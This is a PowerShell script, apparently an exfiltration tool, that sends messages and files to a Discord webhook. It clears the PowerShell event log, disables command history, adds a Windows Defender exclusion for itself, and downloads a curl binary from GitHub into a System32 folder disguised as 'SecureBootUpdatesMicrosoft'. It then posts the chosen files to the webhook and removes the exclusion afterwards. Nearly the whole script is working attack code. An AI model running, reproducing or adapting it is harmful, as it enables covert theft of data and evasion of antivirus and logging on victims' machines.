param (
    [string]$Message,
    [string[]]$Files
)
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$scriptPath = $MyInvocation.MyCommand.Path
$exePath = "$scriptPath.exe"
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $exePath) {
    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
}
$webhookUrl = "from important section, dataupload"
$curlurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/curl.exe"
#$downloadedFileName = [System.IO.Path]::GetFileName($curlurl)
$programNameWithExtension = [System.IO.Path]::GetFileName($curlurl)
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
if (Test-Path $destinationPath) {
    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
    $hashesData = (Invoke-WebRequest -Uri $hashesUrl -UseBasicParsing).Content
    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
    if ($hashesData -match $hashRegex) {
        $programHash = $matches[1]
    }
    if ($programHash -eq $existingFileHash) {
    } else {
        Remove-Item -Path $destinationPath -Force
    }
}
if (-not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $curlurl -OutFile $destinationPath
}
if ($Message) {
    $messagePayload = @{
        content = $Message
    }
    $messagePayloadString = $messagePayload | ConvertTo-Json
    $messageResponse = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $messagePayloadString -ContentType "application/json"
    if ($null -ne $messageResponse) {
        #Write-Host "Message sent to Discord successfully: $Message"
    } else {
        #Write-Host "Failed to send the message to Discord: $Message"
    }
}
if ($Files) {
    foreach ($file in $Files) {
        if (Test-Path $file -PathType Leaf) {
            $fileName = [System.IO.Path]::GetFileNameWithoutExtension($file)
            $curlCommand = "C:/Windows/System32/SecureBootUpdatesMicrosoft/curl.exe -k -s -X POST -H 'Content-Type: multipart/form-data' -F 'file=@$file' -F 'content=$fileName' $webhookUrl"
            Invoke-Expression $curlCommand | Out-Null
            #Write-Host "File sent to Discord successfully: $fileName"
        } else {
            #Write-Host "File not found: $file"
        }
    }
}
Remove-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
Remove-Item -Path $curlurl -Confirm:$false -Force -ErrorAction SilentlyContinue